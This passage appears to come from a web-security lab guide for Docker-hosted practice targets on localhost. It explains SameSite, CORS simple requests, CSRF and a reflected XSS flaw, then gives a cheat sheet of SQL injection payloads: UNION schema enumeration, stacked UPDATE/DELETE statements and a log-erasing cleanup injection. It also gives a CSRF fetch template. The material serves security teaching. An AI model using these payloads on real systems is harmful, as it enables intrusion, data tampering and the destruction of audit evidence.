> **Answer:** The SameSite cookie specification defines a "site" by its registrable domain (eTLD+1), disregarding port numbers and schemes. Because both services run on `localhost`, they are considered **Same-Site**. Under default `SameSite=Lax` rules, cookies are attached to Same-Site requests.

### Q2: Why did copying the fetch from DevTools fail, but our manual fetch succeeded?
> **Answer:** DevTools fetch commands copy browser-specific non-standard headers (`sec-ch-ua`, custom accept headers), triggering a CORS Preflight (`OPTIONS` request). Because the backend lacks CORS headers, the preflight fails and the browser cancels the POST. Stripping the request down to standard headers and `Content-Type: application/x-www-form-urlencoded` creates a **CORS Simple Request**, which the browser dispatches immediately without preflight.

### Q3: Why doesn't CORS prevent the CSRF attack?
> **Answer:** CORS is a client-side security mechanism designed to prevent malicious JavaScript from **reading** responses from other origins. CORS does **not** stop the browser from **dispatching** the request, nor does it stop the server from **executing** the mutation. In CSRF, the attacker does not need to read the response.

### Q4: Why did we need to URL-encode `</script>` inside the payload?
> **Answer:** The HTML tokenizer has a greedy rule: whenever it encounters `</script>`, it immediately closes the active script block regardless of whether it is enclosed in JavaScript quotes or comments. URL-encoding `</script>` as `%3C%2Fscript%3E` bypasses the HTML parser; the server URL-decodes it cleanly upon receiving the request.

### Q5: In Section B1, why does the forum feed remain safe while `/search` executes XSS?
> **Answer:** The forum feed runs messages through `safeLinkify()`, which wraps URLs inside `<a href="...">` and escapes HTML entities with `escapeHtml()`. The search endpoint, however, has a logic flaw: when a search matches 0 rows, it interpolates the query parameter `${q}` directly into `<p>No results for "${q}"</p>` without calling `escapeHtml()`.

### Q6: How does the bonus cleanup payload delete itself?
> **Answer:** The application logs the request *before* executing the SQL query. When our stacked query runs `DELETE FROM log WHERE submitted_id = '<attacker_id>'`, it deletes every row matching the attacker's ID, which simultaneously erases all prior attack submissions and the cleanup query itself.

---

## 8. Quick-Fire Payload & Command Cheat Sheet

### Docker Management
```bash
# Load images
docker load --input <Section>-images.tar

# Start environment
docker compose up -d

# Check running containers & port mappings
docker compose ps

# View live container logs
docker compose logs -f

# Reset everything to clean state
docker compose down && docker compose up -d
```

### SQL Injection Reconnaissance Snippets
```sql
# Check injection boolean response
' AND '1'='1
' AND '1'='0

# Column count testing (increment until error)
' ORDER BY 1 LIMIT 1 -- -
' ORDER BY 5 LIMIT 1 -- -
' ORDER BY 6 LIMIT 1 -- -

# Reflect column numbers
' UNION SELECT 1, 2, 3, 4, 5 -- -

# Introspect database name
' UNION SELECT 1, '', DATABASE(), 4, 5 -- -

# Introspect table names
' UNION SELECT 1, '', GROUP_CONCAT(table_name), 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE() -- -

# Introspect column names
' UNION SELECT 1, '', GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<table_name>' -- -
```

### Stacked Modification & Cleanup Snippets
```sql
# Test stacked statements
<secret>'; UPDATE <table_name> SET <column_name> = 'TEST' WHERE <id_col> = <id>; -- -

# Bonus log cleanup
<secret>'; DELETE FROM log WHERE submitted_id = '<attacker_id>'; -- -
```

### Minimal CSRF Simple Request Template
```javascript
fetch("http://localhost:<PORT>/<ENDPOINT>", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  credentials: "include",
  body: "param1=val1&param2=val2"
});
```
